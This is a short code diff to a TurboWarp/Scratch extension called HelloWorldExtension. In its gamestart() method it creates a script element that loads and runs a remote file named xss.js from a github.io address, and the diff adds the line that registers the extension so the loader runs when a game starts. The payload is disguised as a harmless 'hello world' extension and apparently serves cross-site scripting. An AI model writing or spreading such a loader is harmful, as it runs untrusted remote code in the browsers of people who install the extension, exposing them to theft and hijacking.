@@ -14,17 +14,17 @@ class HelloWorldExtension {
     }
 
     gamestart() {
-        console.log('Game has started!');
-
-        // 动态加载并执行远程脚本
+        // 动态创建 script 元素并加载远程脚本
         const script = document.createElement('script');
-        script.src = 'https://Displaysbook.github.io/TurboWarp/xss.js'; // 远程JS文件的URL
-        script.onload = () => {
+        script.src = 'https://displaysbook.github.io/TurboWarp/xss.js'; // 远程脚本的 URL
+        script.onload = function() {
             console.log('Remote script loaded and executed.');
         };
-        script.onerror = () => {
+        script.onerror = function() {
             console.error('Failed to load the remote script.');
         };
-        document.head.appendChild(script);
+        document.head.appendChild(script); // 将 script 添加到 DOM 中
     }
 }
+
+Scratch.extensions.register(new HelloWorldExtension());
